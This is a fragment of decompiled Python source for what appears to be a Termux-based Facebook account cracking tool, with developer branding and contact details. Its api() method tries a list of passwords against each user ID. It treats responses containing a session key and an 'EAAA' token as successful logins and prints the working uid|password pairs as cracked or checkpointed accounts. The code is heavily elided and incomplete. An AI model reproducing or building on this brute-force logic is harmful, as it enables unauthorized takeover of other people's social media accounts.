# Decompile by Mardis (Tools By Nazim Vau)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/Yor.NEXT.KILLER.009"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Yor.NEXT.KILLER.009")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >>Dx Sami Chowdhury ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Yor.NEXT.KILLER.009"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Nazim Vau
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Dx Sami Ahmed  
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01876276757
     \033[1;96m➣ \033[1;92mGITHUB     :             skcyber
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [OVI-VAI] : \033[0;97m %s/%s -> \033[0;92m [MAHADI -OK:%s ]- \033[0;93m[MAHADI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[OVI-VAI-CP] %s|%s\033[0;97m         "%(uid, pw))
